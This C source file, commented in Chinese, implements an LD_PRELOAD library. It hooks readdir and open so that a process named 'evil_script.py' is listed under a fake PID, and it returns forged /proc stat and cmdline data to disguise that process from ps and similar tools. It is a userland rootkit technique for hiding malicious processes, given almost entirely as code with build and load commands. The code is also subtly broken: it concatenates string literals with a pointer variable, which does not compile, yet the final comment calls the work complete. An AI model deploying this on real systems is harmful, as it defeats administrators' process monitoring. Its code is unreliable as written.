/* libfakeproc.c
 *
 * 编译:
 *     gcc -fPIC -shared -o libfakeproc.so libfakeproc.c -ldl
 *
 * 运行示例:
 *     export LD_PRELOAD=$PWD/libfakeproc.so
 *     ps -eo pid,comm,args | grep -E 'FAKE|evil_script'
 *
 * 原理简介:
 *   - 通过 LD_PRELOAD 在用户态“钩住” libc 的 readdir/readdir64，
 *     当遍历 /proc 目录时，把目标进程对应的目录项 (PID) 改写成自定义 fake_pid。
 *   - 同时钩 open/open64: 若调用方尝试打开 /proc/<fake_pid>/stat 或 cmdline，
 *     返回一个匿名 memfd，里面填充我们手工构造的假数据，伪装进程名和命令行。
 */

#define _GNU_SOURCE             /* 启用 RTLD_NEXT、memfd_create 等 GNU 扩展 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <dirent.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stddef.h>             /* offsetof */

/*=============================== 1. 用户自定义区 =================================*/

/* 需要被“替换掉”的真实进程名（完全匹配 /proc/<pid>/stat 中括号内的 comm 字段） */
static const char *process_to_filter = "evil_script.py";

/* 伪造的 PID（建议使用系统当前不会出现的大号，避免与真实进程碰撞） */
static const char *fake_pid  = "424242";

/* 伪造的 comm 字段（进程名）——出现在 /proc/<pid>/stat 括号内，以及 /proc/<pid>/comm */
static const char *fake_comm = "FAKE_daemon";

/* 伪造的 /proc/<pid>/cmdline 内容，用 `\0` 作为参数分隔，结尾再补一个 `\0` */
static const char *fake_cmd  = "FAKE_daemon\0--serve\0";

/*=============================== 2. 工具函数区 ====================================*/

/* ---------- 2.1 通过 DIR* 句柄获取其真实路径（借助 /proc/self/fd） ---------- */
static int get_dir_name(DIR *dirp, char *buf, size_t size)
{
    int fd = dirfd(dirp);               /* 把 DIR* 转换为底层 fd */
    if (fd == -1) return 0;

    char linkpath[64];
    snprintf(linkpath, sizeof(linkpath), "/proc/self/fd/%d", fd);

    ssize_t n = readlink(linkpath, buf, size - 1);
    if (n == -1) return 0;

    buf[n] = '\0';
    return 1;
}

/* ---------- 2.2 通过字符串形式的 pid 解析 /proc/<pid>/stat 以获取进程名 ---------- */
static int get_process_name(const char *pid, char *buf)
{
    /* 确保传入的是纯数字字符串；非数字直接返回失败 */
    if (strspn(pid, "0123456789") != strlen(pid)) return 0;

    char stat_path[256];
    snprintf(stat_path, sizeof(stat_path), "/proc/%s/stat", pid);

    FILE *f = fopen(stat_path, "r");
    if (!f) return 0;

    char line[512];
    if (!fgets(line, sizeof(line), f)) {
        fclose(f);
        return 0;
    }
    fclose(f);

    /* /proc/<pid>/stat 格式: pid (comm) state ... */
    int dummy;
    /* %[^\)] 读取直到右括号 ) 之前的所有字符 */
    if (sscanf(line, "%d (%[^)])", &dummy, buf) != 2)
        return 0;

    return 1;
}

/*=============================== 3. readdir/readdir64 钩子 =========================*/

/* 声明原始 libc 版本的函数指针 */
static struct dirent *(*orig_readdir)(DIR *)   = NULL;
static struct dirent *(*orig_readdir64)(DIR *) = NULL;

/* 核心包装：在 /proc 目录遍历时，把目标进程条目改写成 fake_pid */
static struct dirent *hijack_readdir_once(DIR *dirp,
                                          struct dirent *(*real_func)(DIR *))
{
    while (1) {
        struct dirent *dir = real_func(dirp);   /* 调用真正的 readdir */
        if (!dir) return NULL;                  /* 已到目录末尾 */

        /* 仅关心遍历 /proc 目录时的条目，其它目录保持原样 */
        char dir_path[256], proc_name[256];
        if (get_dir_name(dirp, dir_path, sizeof(dir_path)) &&
            strcmp(dir_path, "/proc") == 0 &&
            get_process_name(dir->d_name, proc_name) &&
            strcmp(proc_name, process_to_filter) == 0)
        {
            /* 命中需要过滤的进程 —— 构造一个静态副本并篡改 d_name */
            static struct dirent fake;
            memcpy(&fake, dir, sizeof(struct dirent));

            strncpy(fake.d_name, fake_pid, sizeof(fake.d_name) - 1);
            fake.d_name[sizeof(fake.d_name) - 1] = '\0';

            /* 更新记录长度，确保新长度合法 */
            fake.d_reclen = offsetof(struct dirent, d_name)
                            + strlen(fake.d_name) + 1;

            return &fake;       /* 返回伪造目录项 */
        }
        /* 不需要替换，则直接返回原条目 */
        return dir;
    }
}

/* -------------- 钩子导出：readdir ---------------- */
struct dirent *readdir(DIR *dirp)
{
    if (!orig_readdir)
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    return hijack_readdir_once(dirp, orig_readdir);
}

/* -------------- 钩子导出：readdir64 -------------- */
struct dirent *readdir64(DIR *dirp)
{
    if (!orig_readdir64)
        orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    return hijack_readdir_once(dirp, orig_readdir64);
}

/*=============================== 4. open/open64 钩子 ==============================*/

/*
 * 思想：
 *   - 如果调用者试图打开 /proc/<fake_pid>/stat 或 cmdline，
 *     我们返回一个匿名 memfd，内含伪造数据。
 *   - 其余路径继续调用原 libc open/open64。
 */

/* 保存原 libc 函数地址 */
static int (*orig_open)(const char *, int, ...)   = NULL;
static int (*orig_open64)(const char *, int, ...) = NULL;

/* 工具函数：创建并返回只读 memfd，fd 指针将自动回到文件起始位置 */
static int create_memfd_with_data(const char *name, const char *data,
                                  size_t len)
{
    int fd = memfd_create(name, 0);     /* 匿名文件，自动位于内存 */
    if (fd == -1) return -1;
    write(fd, data, len);
    lseek(fd, 0, SEEK_SET);             /* 重置读写指针，方便调用方读 */
    return fd;
}

/* 统一封装 open 逻辑，避免重复代码 */
static int open_common(const char *pathname, int flags, mode_t mode,
                       int is_open64)
{
    /* ---------- 4.1 拦截 /proc/<fake_pid>/stat ---------- */
    if (strcmp(pathname, "/proc/"fake_pid"/stat") == 0) {
        char buf[256];

        /* 只需要保证 ps / top 能解析前几字段即可
         * 核心字段:  pid (comm) state ppid
         * 这里把 state 填为 'R' (运行态)，ppid=1 */
        snprintf(buf, sizeof(buf),
                 "%s (%s) R 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n",
                 fake_pid, fake_comm);

        int fd = create_memfd_with_data("fake_stat", buf, strlen(buf));
        if (fd != -1) return fd;
    }

    /* ---------- 4.2 拦截 /proc/<fake_pid>/cmdline ---------- */
    if (strcmp(pathname, "/proc/"fake_pid"/cmdline") == 0) {
        int fd = create_memfd_with_data("fake_cmd",
                                        fake_cmd,
                                        /* 注意包含结尾双 \0 */
                                        strlen(fake_cmd) + 1);
        if (fd != -1) return fd;
    }

    /* ---------- 4.3 其它路径 —> 调用 libc 原版 ---------- */
    if (!is_open64) {
        /* open */
        if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");

        if (flags & O_CREAT)
            return orig_open(pathname, flags, mode);
        else
            return orig_open(pathname, flags);
    } else {
        /* open64 */
        if (!orig_open64) orig_open64 = dlsym(RTLD_NEXT, "open64");

        if (flags & O_CREAT)
            return orig_open64(pathname, flags, mode);
        else
            return orig_open64(pathname, flags);
    }
}

/* ----------------------- 导出 open ----------------------- */
int open(const char *pathname, int flags, ...)
{
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list ap; va_start(ap, flags);
        mode = va_arg(ap, int);
        va_end(ap);
    }
    return open_common(pathname, flags, mode, 0);
}

/* ----------------------- 导出 open64 --------------------- */
int open64(const char *pathname, int flags, ...)
{
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list ap; va_start(ap, flags);
        mode = va_arg(ap, int);
        va_end(ap);
    }
    return open_common(pathname, flags, mode, 1);
}

/*==================================================================================
 *  至此，完整功能实现：
 *    - /proc 目录枚举：真实 evil_script.py → 被替换为 fake_pid
 *    - 读取 /proc/fake_pid/stat & cmdline：返回伪造内容 → 进程名/命令行同步伪装
 *  其余系统调用保持原状，对正常进程无副作用。
 *==================================================================================*/
